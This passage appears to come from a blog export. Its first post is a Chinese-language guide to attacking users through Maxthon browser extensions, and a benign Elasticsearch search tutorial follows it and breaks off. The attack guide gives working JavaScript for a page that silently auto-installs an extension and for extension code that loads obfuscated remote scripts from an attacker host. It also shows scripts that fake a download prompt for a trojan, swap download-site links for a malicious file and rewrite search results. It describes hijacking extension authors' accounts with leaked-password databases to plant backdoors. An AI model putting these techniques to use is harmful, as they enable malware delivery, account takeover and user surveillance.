&apos;确定&apos;); }}function returnIsInstall(frameVersion, packMxVersion) { var fvItem; var pvItem; var frameVersion = getVersionArr(frameVersion); var packMxVersion = getVersionArr(packMxVersion); // 定义增长索引值. var i = 0; while (1) { fvItem = frameVersion[i]; pvItem = packMxVersion[i]; if (fvItem == null &amp;&amp; pvItem == null) { return 0; } if (fvItem == null) { return -1; } if (pvItem == null) { return 1; } if (fvItem != pvItem) { var value = fvItem &gt; pvItem ? 1 : -1 return value; } i++; }}function getVersionArr(version) { var versionArr = version.split(&apos;.&apos;); for (var i = 0; i &lt; versionArr.length; i++) { versionArr[i] = parseInt(versionArr[i], 10); }; return versionArr;}function getUser(id) { $.ajax({ type: &apos;GET&apos;, url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id, data: &apos;data&apos;, dataType: &apos;json&apos;, success: function (data) {}, error: function () {} });}$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) { event.preventDefault(); event.stopPropagation(); getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);}); 详情可以在http://extension.maxthon.cn/js/temp.js里第1256行到1600行查看原始代码。 此处的代码里的入口处就在12345$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) { event.preventDefault(); event.stopPropagation(); getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);}); 当点击id为app-install的DOM时，会先调用getInstallMessage函数，getInstallMessage函数里再调用installPack函数，installPack函数调用returnIsInstall函数和getUser函数，returnIsInstall函数调用了getVersionArr函数。 最核心的代码在installPack函数里的external.mxCall('InstallApp', packUrl);，但是无法直接调用，不然无法安装。而且这里的packUrl必须是http://extension.maxthon.cn下的，不然无法安装，需要事先提交你的插件到遨游插件平台，才可以。 上面说到当点击id为app-install的DOM时才会触发，我这个人比较懒。就直接copy遨游插件的html代码了，顺便把他隐藏了：&lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;，这里的file_id为&lt;?echo $view_id;?&gt;估计是遨游的程序员没写好代码，PHP没解析成功，解析成html代码了。但是我懒得改，就这样把。然后我再在他们的后面增加$(&quot;#app-install&quot;).click();代码，让他自动触发 完整的网站代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;title&gt;欺骗用户安装插件&lt;/title&gt; &lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; 欺骗用户安装插件demo1 &lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;&lt;/body&gt;&lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; setTimeout(function(){ if(typeof(plug_setup)!=&quot;function&quot;){ alert(&quot;因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后打开此页面&quot;); var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos; function getInstallMessage(that, messagePack, type) { if (external.mxCall) { var packMxAttr = $(that).closest(messagePack); if (type === &apos;skin&apos;) { // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;); } else if (type === &apos;app&apos;) { // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;); // 下个版本上了就删掉-- if (frameVersion === &apos;1.0.0&apos;) { frameVersion = &apos;1.0.1&apos;; } // --下个版本上了就删掉 } // 插件包框架版本号 var packMxVersion = packMxAttr.attr(&apos;file_def&apos;); // 插件包url var packUrl = packMxAttr.attr(&apos;file_url&apos;); // 插件id var packId = packMxAttr.attr(&apos;file_id&apos;); console.log(frameVersion, packMxVersion, packUrl, type, packId) installPack(frameVersion, packMxVersion, packUrl, type, packId); } else { resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;); } } function installPack(frameVersion, packMxVersion, packUrl, type, packId) { var isInstall = returnIsInstall(frameVersion, packMxVersion); if (isInstall !== -1) { if (type === &apos;skin&apos;) { external.mxCall(&apos;InstallSkin&apos;, packUrl); } else if (type === &apos;app&apos;) { external.mxCall(&apos;InstallApp&apos;, packUrl); } getUser(packId); } else { resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;); } } function returnIsInstall(frameVersion, packMxVersion) { var fvItem; var pvItem; var frameVersion = getVersionArr(frameVersion); var packMxVersion = getVersionArr(packMxVersion); // 定义增长索引值. var i = 0; while (1) { fvItem = frameVersion[i]; pvItem = packMxVersion[i]; if (fvItem == null &amp;&amp; pvItem == null) { return 0; } if (fvItem == null) { return -1; } if (pvItem == null) { return 1; } if (fvItem != pvItem) { var value = fvItem &gt; pvItem ? 1 : -1 return value; } i++; } } function getVersionArr(version) { var versionArr = version.split(&apos;.&apos;); for (var i = 0; i &lt; versionArr.length; i++) { versionArr[i] = parseInt(versionArr[i], 10); }; return versionArr; } function getUser(id) { $.ajax({ type: &apos;GET&apos;, url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id, data: &apos;data&apos;, dataType: &apos;json&apos;, success: function (data) {}, error: function () {} }); } $(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) { event.preventDefault(); event.stopPropagation(); getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;); }); $(&quot;#app-install&quot;).click(); } },1000);&lt;/script&gt;&lt;/html&gt; 打开后的样子: 这处的LOL战绩查询插件是我之前上传的(不要安装)。真正攻击时可以换成不要那么二的名字，比如”网站增强工具”等 一开始，我还想试试能不能点击劫持，这样就可以在用户不知情的情况下安装插件，但是这个安装程序不是在页面里面的。无法进行劫持，随之放弃。 这样一来，尽量让用户少思考的网页就做好了。发布，等待用户上钩吧。这个方法可以与APT攻击中的”水坑攻击”进行相结合，以达到针对性某些特殊的群体或个体的攻击方式 0x1.2 被动等待这个办法是属于广撒网，当没有指定性群体或者个人，只是为了单纯的攻击或者研究时使用。 这里也有一些小技巧，当开发者上传插件时，遨游审核人员会对插件进行审核，如果发现危害用户的代码，将不给予通过，乍一看没什么问题，但是没有后续了。 没有定期自动化扫描插件代码 而且即使插件是一个小游戏用，都可以在配置文件def.json里申请权限是最高的 当代码量足够多的时候，开发人员可以把一些危害到用户请求的代码进行加密混编绕过审查人员的眼睛。（调用伟大的人民领袖毛主席的一句话:与规矩斗，其乐无穷。与代码斗其乐无穷。与人斗其乐无穷。） 可以在插件里调用第三方的JavaScript代码，第三方url可以指向任何域名。没有进行判断URL及js文件是否为可信 利用以上的问题，我们就可以写出一个具有危害到用户插件，且绕过审查人员的眼睛。 我们可以在插件源码base.js文件里写12345//xxxxx其他多余的代码var script = document.createElement('script');script.src = \"http://你的域名/javascript文件名.js\";document.body.appendChild(script);//xxxxx其他多余的代码 如果不放心可可以加密成下面的这种格式:1eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&apos;&apos;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&apos;\\\\w+&apos;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\\\b&apos;+e(c)+&apos;\\\\b&apos;,&apos;g&apos;),k[c]);return p;}(&apos;o 7=[&quot;\\\\e\\\\c\\\\g\\\\b\\\\a\\\\9&quot;,&quot;\\\\c\\\\g\\\\6\\\\8\\\\9\\\\6\\\\q\\\\h\\\\6\\\\j\\\\6\\\\f\\\\9&quot;,&quot;\\\\e\\\\g\\\\c&quot;,&quot;\\\\m\\\\9\\\\9\\\\a\\\\t\\\\i\\\\i\\\\d\\\\n\\\\j\\\\8\\\\b\\\\f\\\\i\\\\l\\\\8\\\\s\\\\8\\\\e\\\\c\\\\g\\\\b\\\\a\\\\9\\\\r\\\\b\\\\h\\\\6\\\\f\\\\8\\\\j\\\\6\\\\u\\\\l\\\\e&quot;,&quot;\\\\8\\\\a\\\\a\\\\6\\\\f\\\\d\\\\w\\\\m\\\\b\\\\h\\\\d&quot;,&quot;\\\\x\\\\n\\\\d\\\\v&quot;];o k=p[7[1]](7[0]);k[7[2]]=7[3];p[7[5]][7[4]](k)&apos;,34,34,&apos;||||||x65|_0|x61|x74|x70|x69|x63|x64|x73|x6E|x72|x6C|x2F|x6D|script|x6A|x68|x6F|var|document|x45|x66|x76|x3A|x2E|x79|x43|x62&apos;.split(&apos;|&apos;),0,{})) 方法为：先在javascriptobfuscator上把正常的javascript代码加密成:1var _0x67c5=[&quot;\\x73\\x63\\x72\\x69\\x70\\x74&quot;,&quot;\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74&quot;,&quot;\\x73\\x72\\x63&quot;,&quot;\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x64\\x6F\\x6D\\x61\\x69\\x6E\\x2F\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x66\\x69\\x6C\\x65\\x6E\\x61\\x6D\\x65\\x2E\\x6A\\x73&quot;,&quot;\\x61\\x70\\x70\\x65\\x6E\\x64\\x43\\x68\\x69\\x6C\\x64&quot;,&quot;\\x62\\x6F\\x64\\x79&quot;];var script=document[_0x67c5[1]](_0x67c5[0]);script[_0x67c5[2]]= _0x67c5[3];document[_0x67c5[5]][_0x67c5[4]](script) 如图： 因为这样的代码看起来着实有点可疑…所以再去站长之家加密成常见的加密代码: 嗯，看着正常多了。放在众多代码之中，审查人员也很难找到(也不会用心找的) 提交后，会在遨游插件的首页显示最近更新的插件，你只需要每个星期随便增加一点代码或者删除一点代码，再更新一下插件，你的插件就会常年存在插件首页，安装人数想不多都难。 0x1.3 基于社工库控制插件作者的账户这个也是我个人来说最喜欢的方式，毕竟不得不承认不劳而获真的好爽啊。 因为Maxthon更新插件时没有像Chrome那样需要秘钥才可以更新，所以导致这个’逻辑漏洞’’。因为没有验证当前是否为作者本人的机制，才导致这个方法的可行性。 之前加了maxthon插件的作者群：203339427 里面大多都是插件的开发人员，拿他们的邮箱、QQ放在社工库里进行查询，得到密码后可以进行尝试登陆。当然因为不确定是作者使用的是哪个邮箱，我们先拿QQ邮箱登录，他会提示账户或密码错误，不知道是账户错误还是密码错误，可以先去遨游账户中心-忘记密码先填写QQ邮箱，如果说用户名不存在，我们可以在网上搜索一下这个作者其他的邮箱，再进行测试(我测试的账户里，很多都需要在网上搜索一下其他的邮箱)。因为之前我把这个当做漏洞提交给wooyun了，遨游没什么反应。本来是想登陆其他用户说明的，但是wooyun暂时休整，无法看到我之前的漏洞详情，而当时社到的账户和密码也没有备份，只在wooyun漏洞详情里有，没有办法，所以这里我就以我自己为例： 这里有个更新文件，我们这个时候，可以先把文件download本地，在里面的javascript文件里植入我们的后门。再上传上去。就可以控制1000多个用户了。插件二次审核查的更松。 而且当你打开遨游浏览器时，遨游浏览器会检测你的插件是否为最新的，如果不是最新的，他会在后台静默安装最新的插件。这个时候对我们的帮助特别大。比如我们更新插件后，只需要等待用户重新打开遨游浏览器就可以实现了攻击的效果。 更新的时候，就这个账户当做自己的账户就行了，然后照着0x1.2代码写上去就没问题了。 0x1.4 控制插件里调用的第三方javascript代码这个方法比较繁琐，有两种方法来获取第三方的javascript，分为两种情况 不具有可视化页面 具有可视化页面 0x1.4.1 不具有可视化页面类似我上面所说的，在插件的def.json配置文件里写上:1234567891011\"actions\": [{ \"type\": \"script\", \"entryPoints\": [ \"doc_onload\" ], \"js\": [ \"base.js\" ], \"include\": [\"*\"], \"includeFrames\": true}] 然后在base.js文件里写入你要调用的第三方javascript文件：123var script = document.createElement('script');script.src = \"http://119.29.58.242/control.js\";document.body.appendChild(script); 像这种的话，就需要在把插件download本地，然后使用maxthon官方提供的MxPacker软件，进行的解密，首先分析def.json里的action字段下的js属性，指向的是哪个javascript文件。再进行分析，当然也可以使用其他软件对文件内容进行搜索，看里面是否存在’document.createElement’关键字。 找到后，接下来就是苦力活了，入侵这个第三方javascript所属的网站。入侵后再修改这个javascript文件，就行了。 0x1.4.2 具有可视化页面这个比上面0x1.4.1简单点，使用之前长短短在zone分享的代码就可以把这个页面所有第三方的javascript文件列举出来：1234567for(var i=0,tags=document.querySelectorAll('iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'),tag;tag=tags[i];i++){ var a = document.createElement('a'); a.href = tag.src||tag.href||tag.data; if(a.hostname!=location.hostname){ console.warn(location.hostname+' 发现第三方资源['+tag.localName+']:'+a.href); }} 使用方法如下： 使用的时候，会发现有的插件是调用了插件本身的javascript文件，或者其他baidu、360等第三方安全不容易被入侵的网站里的javascript代码，这个时候就比较费时费力了。 0x1.4.3 控制插件里调用的第三方javascript代码总结这个方法较为繁琐，优点如下： 不容易被发现 向上反查也比较难追踪 缺点： 费时费力 成功率较低 此种方法适用于针对某一人或团体，只能获得其装的插件名称，当别无他法时使用此方法。 0x2 那些隐藏的API： 因为一些API获得的信息比较隐私，所以遨游官方没在在API手册里写。但是他们真实存在，我们可以在一个普通的页面里打开审查元素下的Console输入external来查看一些遨游官方隐藏的API。 还有一种是在插件页面的里专用API，插件里的API基本上每个版本上都会发生变化，下面是3.x版本的API：12345maxthon.system.Utility.getMacAddresses() //获取用户的MAC地址maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames() //获取用户当前所有的字体文maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getSystemFontName() //用户当前应用的字体maxthon.io.File.createTempFile().name_ //获取用户临时目录maxthon.io.File.createTempFile().isFile //判断name_文件是否存在，但是这里我无法重新设置name_的值 下面是最新版本4.x版本的API： 遨游把之前在maxthon对象下的函数、对象分离在其他地方了（其实还是有，不明白其用意）123456789mx.app.getAvatar() //获得当前登录用户的头像(data:image/png;base64格式)mx.app.login() //判断是否登录了遨游浏览器(登录返回true，没登陆返回false)mx.app.getProfile() //获得用户当前的状态(是否登录、uid、用户名称)mx.app.getSystemLocale() //获得系统语言(例如：zh-cn)mx.app.showUserPanel() //显示用户菜单(相当于点击左上角的头像)//以上的代码需要事先运行mx.app.user()、mx.app.locale()clientInformation.plugins //浏览器支持的插件(可看到用户安装哪些软件)clientInformation.mimeTypes //列举出支持的application(可看到用户安装哪些软件) 这里针对最后两个API截图看下： 这些东西写在插件里，获取用户安装了哪些软件轻而易举。基本上是没有隐私可言了。 0x3 攻击向量： 普通的获取cookies我们就不说了，介绍点其他的。 上面介绍的都是针对浏览器插件对用户进行的攻击，但是攻击的平面都是浏览器。但是谁不想进一步控制用户的电脑权限呢。大致的思路如下： 弹窗欺骗用户说需要下载软件，其实是木马程序 使用浏览器漏洞进行攻击 替换下载链接 0x3.1 弹窗欺骗用户下载软件这一步很简单，就是一些简单的javascript代码：1234(function(){ //闭包函数，防止变量污染 alert(\"请下载xxx安全插件保障您在此网站的安全\"); location.href = \"http://baidu.com/download/xxxx.exe\";})() 但是这里不能一直弹窗下载，不然肯定会引起怀疑的，下面我们来进行优化：1234567891011121314(function(){ //闭包函数，防止变量污染 var downDate = new Date(); //获取当前的时间 var downDateY = String(downDate).split(\" \")[3]; //年份 var downDateM = String(downDate).split(\" \")[1]; //月份 var downDateD = String(downDate).split(\" \")[2]; //日期 var downDateT = String(downDate).split(\" \")[4].split(\":\"); //时间 if(location.href != \"https://baidu.com/\"){ //当不是百度时，不执行下面的代码 return fasle; } if(downDateY == \"2016\" &amp;&amp; downDateM == \"Oct\" &amp;&amp; downDateD == \"28\" &amp;&amp; downDateT[0] == \"21\" &amp;&amp; downDateT[1] &lt; \"30\"){ alert(\"请下载xxx安全插件保障您在此网站的安全\"); location.href = \"http://baidu.com/download/xxxx.exe\"; }})() 真正写的时候，不要像我这么写，我这样写是因为逻辑比较简单，但是代码量比较多。意思是说当当前网站是https://baidu.com/时再判断时间是否为2016年10月28号晚上9点到9点半之间，如果是则弹窗让用户下载木马程序。 0x3.2 使用浏览器漏洞进行攻击漏洞是要靠自己挖掘的，这里不再多说，大家可以去看一下Blast写的书籍《浏览器安全》。也可以看下之间黑哥写的PPT《去年跨过的浏览器》，之前maxthon就因为特殊域下的mxCall函数的问题，导致可以执行任意命令。大家可以挖挖看，总会有意想不到的收获。 0x3.3 替换下载链接替换的话，我们需要先采集几个下载量比较大的下载站，我这里列举一下： ZOL下载-免费软件,绿色软件 天空下载站 华军软件园 hao123下载站 太平洋下载中心 百度软件中心 还有很多，这里就不在列举了，下面我们就根据这些下载站来写替换的javascript代码。先写段代码，让他判断当前的网址是否为下载站123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960(function(){ var downloadWebsite = [ 'http://xiazai.zol.com.cn', 'http://www.skycn.com', 'http://www.onlinedown.net', 'http://dl.pconline.com.cn', 'http://rj.baidu.com' ]; //要替换的下载站url地址 var replaceDownloadUrl = \"http://xxxx.com/download/soft.rar\"; //要替换的下载软件 switch(location.origin){ //对当前的url进判断，是否为下载站，如果是则进入其操作函数里 case downloadWebsite[0]: var download1 = document.getElementById(\"downloadTop\"); var download2 = document.querySelectorAll(\".down-alink a\"); var download3 = document.querySelectorAll(\".down-alink01 a\"); if(download1 != null &amp;&amp; download2.length != 0 &amp;&amp; download3.length != 0){ download1.href = replaceDownloadUrl; for(var j = 0;j &lt; download2.length;j++){ download2[j].href = replaceDownloadUrl; } for(var k = 0;k &lt; download3.length;k++){ download3[k].href = replaceDownloadUrl; } } break; case downloadWebsite[1]: var download1 = document.querySelectorAll(\".ul_Address li a\"); if(download1.length != 0){ for(var j = 0;j &lt; download1.length;j++){ download1[j].href = replaceDownloadUrl; } } break; case downloadWebsite[2]: var download1 = document.querySelectorAll(\".softinfoBox .meg a\"); var download2 = document.querySelectorAll(\".downDz a\");; if(download1.length != 0 &amp;&amp; download2.length != 0){ download1[0].href = replaceDownloadUrl; for(var j = 0;j &lt; download2.length;j++){ download2[j].href = replaceDownloadUrl; } } break; case downloadWebsite[3]: var download1 = document.querySelectorAll(\".dlLinks-a a\"); if(download1.length != 0){ for(var j = 0;j &lt; download1.length;j++){ download1[j].href = replaceDownloadUrl; } } break; case downloadWebsite[4]: var download1 = document.querySelectorAll(\".fast_download\"); var download2 = document.querySelectorAll(\".normal_download\"); if(download1.length != 0 &amp;&amp; download2.length != 0){ download1[0].href = replaceDownloadUrl; download2[0].href = replaceDownloadUrl; } break; }})() 0x3.4 修改百排名想做SEO的，可以使用此方法：12345(function(){ if(location.origin == \"https://www.baidu.com\" &amp;&amp; location.pathname == \"/s\"){ //当时百度的搜索页面时 document.querySelectorAll(\"#content_left h3 a\")[0].href = \"http://360.cn/\"; //替换第一个搜索结果为指定的url地址 }})() 0x3.4 内网嗅探这个方法的篇幅比较多，放在下一章说明。下面是利用WebRTC来实现的获取内网IP地址：12345678910111213141516171819202122232425262728293031323334var ipList = [];var webrtcxss = { webrtc : function(callback){ var ip_dups = {}; var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; var mediaConstraints = { optional: [{RtpDataChannels: true}] }; var servers = undefined; if(window.webkitRTCPeerConnection){ servers = {iceServers: []}; } var pc = new RTCPeerConnection(servers, mediaConstraints); pc.onicecandidate = function(ice){ if(ice.candidate){ var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/; var ip_addr = ip_regex.exec(ice.candidate.candidate)[1]; if(ip_dups[ip_addr] === undefined) callback(ip_addr); ip_dups[ip_addr] = true; } }; pc.createDataChannel(\"\"); pc.createOffer(function(result){ pc.setLocalDescription(result, function(){}); }); }, getIp : function(){ this.webrtc(function(ip){ console.log(ip) }); }}webrtcxss.getIp(); 大家可以根据这个方法来想想有没有办法来实现一些更好玩的思路。 0x4 结言： 还有很多的API及攻击方法等待大家去发掘，我能做的就是给大家打开一个新的攻击平面，不用再局限那些已经熟悉的方法了。 Author:Black-Hole Blog：http://bugs.cc github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","link":"/2016/10/05/browser-plugin-attack-vector/"},{"title":"读书笔记：从Lucene到Elasticsearch:全文检索实战","text":"从Lucene到Elasticsearch:全文检索实战当前的笔记只介绍 Elasticsearch 的搜索部分。 文章中的搜索都是在 kibana 的 Dev tools 进行查询的。 准备工作需要安装 Elasticsearch、kibana、elasticsearch-analysis-ik 具体的安装方式，这里就不再阐述了。（安装完，记得重启 Elasticsearch ） 重启完成后，打开 kibana 的 Dev tools，输入下面的DSL代码，并运行： 12345678910111213141516171819202122232425262728293031323334353637PUT books{ \"settings\": { \"number_of_replicas\": 1, \"number_of_shards\": 3 }, \"mappings\": { \"IT\": { \"properties\": { \"id\": { \"type\": \"long\" }, \"title\": { \"type\": \"text\", \"analyzer\": \"ik_max_word\" }, \"language\": { \"type\": \"keyword\" }, \"author\": { \"type\": \"keyword\" }, \"price\": { \"type\": \"double\" }, \"year\": { \"type\": \"date\", \"format\": \"yyyy-MM-dd\" }, \"description\": { \"type\": \"text\", \"analyzer\": \"ik_max_word\" } } } }} 运行好后，下载 books.json 文件，并进行导入。如果你安装的 Elasticsearch 版本小于6.0，使用下面的命令进行导入 books.json： 1curl -XPOST \"http://localhost:9200/_bulk?pretty\" --data-binary @books.json 如果你的 Elasticsearch 版本大于6.0，则使用下面的命令进行导入： 1curl -H \"Content-Type: application/json\" -XPOST \"http://localhost:9200/_bulk?pretty\" --data-binary @books.json 基本搜索返回指定index的所有文档123456GET books/_search{ \"query\": { \"match_all\": {} }} 可以简写为： 1GET books/search 查找指定字段中包含给定单词的文档使用term来进行查询，term查询不会被解析，只有查询的词和文档中的词精确匹配才会被搜索到，应用场景为：查询人名、地名等需要精准匹配的需求。 查询title字段中含有思想的书籍 12345678GET books/_search{ \"query\": { \"term\": { \"title\": \"思想\" } }} 返回如下： 对查询结果进行分页有时查询时，会返回成千上万的数据，这种情况下，分页的作用就出来了。 分页有两个属性，分别是from、size from: 从何处开始 size: 返回的文档最大数量 可以理解为：我从from位置把剩下的文档全部返回，然后size限制了返回的数量。 用js代码来诠释就是： 1234567const from = 100 - 1; // 数组从0开始，需要减一const size = 10;const data = [1, 2, 3, ..., 999, 1000];const fromDate = data.splice(from);const result = fromData.splice(0, size);console.log(result) //=&gt; [100, 101, 102, 103, 104, 105, 106, 107, 108, 109] 限制返回字段一般我们查询时，都是为了观察某一个字段，而不是想看全部的字段。而如果是默认情况下，Elasticsearch 会返回的文档的全部字段信息。会对工作造成一定的影响。于是，Elasticsearch 提供了一个接口，用于限制返回的字段。假设我只需要 title 和 author 字段： 123456789GET books/_search{ \"_source\": [\"title\", \"author\"], \"query\": { \"term\": { \"title\": \"java\" } }} 结果如图： 基于最小评分过滤因为 Elasticsearch 在做普通的搜索时，是采用相关性进行搜索的，而相关性是由评分 取决的。所以当我们进行模糊搜索时，Elasticsearch 可能会返回一些相关性不那么高的文档。所以我们可以通过 Elasticsearch 提供的接口，来设置一个评分最低标准，低于这个标准的文档，将不会出现在结果页中。 比如，我想搜索 title 里包含 java 的文档，并且评分不低于0.7： 123456789GET books/_search{ \"min_score\": 0.7, \"query\": { \"term\": { \"title\": \"java\" } }} 结果如图： 高亮关键字有时，我们会把 Elasticsearch 结果直接导入到网页中，这个时候需要高亮关键字，让用户更加清楚自己想要的东西，Elasticsearch 已经提供了一个接口，比如我想让搜索出来的结果中的关键字高亮： 123456789101112131415GET books/_search{ \"_source\": [\"title\"], \"min_score\": 0.7, \"query\": { \"term\": { \"title\": \"java\" } }, \"highlight\": { \"fields\": { \"title\": {} } }} 结果如图： 默认的标签是&lt;em&gt;&lt;/em&gt;，如果你想自定义，可以使用： pre_tags 和 post_tags。最终查询代码为： 1234567891011121314151617GET books/_search{ \"_source\": [\"title\"], \"min_score\": 0.7, \"query\": { \"term\": { \"title\": \"java\" } }, \"highlight\" : { \"pre_tags\" : [\"&lt;h1&gt;\"], \"post_tags\" : [\"&lt;/h1&gt;\"], \"fields\" : { \"title\" : {} } }} 结果如图： 全文查询上节基本都是以 term 进行搜索，但其实 Elasticsearch 提供了很多搜索方法，本章就是介绍 Elasticsearch 有哪些搜索方法、分别起的作用。 本章对 common_terms query、query_string query、simple_query_string query 没有解释说明，因为使用起来较少，而且解释起来较为麻烦。如果想了解，可以参考网上的文章。这里就不在阐述了。 match query我们先使用 term 进行一次查询： 123456789GET books/_search{ \"_source\": [\"title\", \"author\"], \"query\": { \"term\": { \"title\": \"java编程\" } }} 你会发现，其结果为空(但是数据库里是有这个数据的)，如图： 这是因为 term 是匹配分词后的词项来进行查询的。比如刚刚我们查的 java编程 ，在 Elasticsearch 进行分词时，会把 java编程 分为：java 和 编程 。导致匹配不起来。 用代码诠释的话就是： 1234const keyword = 'java编程';const data = ['java', '编程'];const result = data.includes(keyword);console.log(result) //=&gt; false 现在我们把 term 换成 match 来尝试下： 123456789GET books/_search{ \"_source\": [\"title\", \"author\"], \"query\": { \"match\": { \"title\": \"java编程\" } }} 结果如图： 可以发现，已经有结果了，但是为什么会有两个呢？ 原因是因为 match 会对你的关键字进行分词，然后去匹配文档分词后的结果，只要文档里的词项能匹配关键字分词后的任何一个，都会返回到结果里。 代码诠释： 123456789101112131415const data = ['java', '编程', '思想']; // 分词后的文档里的数据const keywords = ['java', '编程', '思想']; // 分词后的关键字const result = (() =&gt; { for (let x = 0; x &lt; data.length; x++) { const dataItem = data[x]; for (let y = 0; y &lt; keywords.length; y++) { const keywordItem = keywords[y]; if (dataItem === keywordItem) { return true; } } } return false;})() 如果我只想让它返回一个呢，并且只能用 match 来做，可以么？ 是可以的，match 提供了一个属性：operator。可以用这个来帮助完成这个需求： 123456789101112GET books/_search{ \"_source\": [\"title\", \"author\"], \"query\": { \"match\": { \"title\": { \"query\": \"java编程\", \"operator\": \"and\" } } }} 最终的结果如图： 原理是因为 operator 属性的值为 and，这样的话，就告诉 Elasticsearch 我要让我的关键字都能和文档里的词项匹配上。有一个没匹配上，我都不要。 如果 operator 属性的值为 or，那结果就和之前是一样的了。 match_phrase query你可以把这个方法理解为自带了 operator 属性的值为 and 的 match。 这个方法有两个限制条件，只有都满足，才会在结果中显示出： 分词后的所有词项都在该字段中，相当于 operator: &quot;and&quot; 顺序要一致 顺序一致指的是什么呢？ 假设你使用 match 来匹配: 编程java，那么结果还是和上面一样。所以如果你需要要求顺序一致性，那么你就可以使用 match_phrase 来做。 如果使用 编程java 来搜索： 如果使用 java编程： match_phrase_prefix query这个方法和 match_phrase 方法类似，不过这个方法可以可以把最后一个词项作为前缀进行匹配，想象一下：用户在搜索栏中搜索 辣鸡UZ，然后下面列表中出现了 辣鸡UZI。 首先 match_phrase_prefix 会先分词为: 辣鸡，然后找了一个文档，再然后匹配 辣鸡 后面的字符串是否以 UZ 开头的。这个时候文档满足条件，就返回出结果。可以假想后面一直有一个(.*)的通配符，如：辣鸡UZ(.*)。 知道原理了，我们现在写一个查询语句： 123456789GET books/_search{ \"_source\": [\"title\", \"author\"], \"query\": { \"match_phrase_prefix\": { \"title\": \"java编\" } }} 结果如图： multi_match querymulti_match 是 match 的升级方法，可以用来搜索多个字段。 比如我不想只在 title 里搜索 java编程，我还想在 description 里进行搜索。那应该怎么做呢？ Elasticsearch 已经提供了 multi_match 专门用来处理这件事情： 12345678910GET books/_search{ \"_source\": [\"title\", \"description\"], \"query\": { \"multi_match\": { \"query\": \"java编程\", \"fields\": [\"title\", \"description\"] } }} 最终结果如图： 并且 multi_match 还支持通配符。上面的查询语句，可以写成： 12345678910GET books/_search{ \"_source\": [\"title\", \"description\"], \"query\": { \"multi_match\": { \"query\": \"java编程\", \"fields\": [\"title\", \"*tion\"] } }} 词项查询上一章是全文查询，这一章是词项查询。他们俩的区别在于： 全文查询：会对查询语句(query)进行分词，然后匹配文档里分词后的数据 词项查询：不会对查询语句进行分词 term query第一章节已经介绍过了，这里就不再阐述了。 terms queryterms 是 term 查询的升级版本，可以用来查询文档中某一字段，是否包含了其关键字。比如，我想查询 title 字段中包含了 优化 或者 基础 的文档： 123456789GET books/_search{ \"_source\": [\"title\"], \"query\": { \"terms\": { \"title\": [\"优化\", \"基础\"] } }} 其结果如图： range query从名字就能猜测出 range 是范围匹配。可以匹配 number、date、string (字符串范围查询比较特殊，比较少用，就不再阐述了) range 支持以下查询参数： gt: 大于 gte: 大于等于 lt: 小于 lte: 小于等于 number 范围查询现在我想查询价格低于70，并大于等于50的书籍。伪代码既：(price &gt;= 50 &amp;&amp; price &lt; 70) ： 123456789101112GET books/_search{ \"_source\": [\"title\", \"price\"], \"query\": { \"range\": { \"price\": { \"gte\": 50, \"lt\": 70 } } }} 其结果如图： date 范围查询如果我想查询，出版日期在 2016-1-1 到 2016-12-31 之间的书籍，那么DSL查询语句就如同以下这样： 12345678910111213GET books/_search{ \"_source\": [\"title\", \"publish_time\"], \"query\": { \"range\": { \"publish_time\": { \"gte\": \"2016-1-1\", \"lte\": 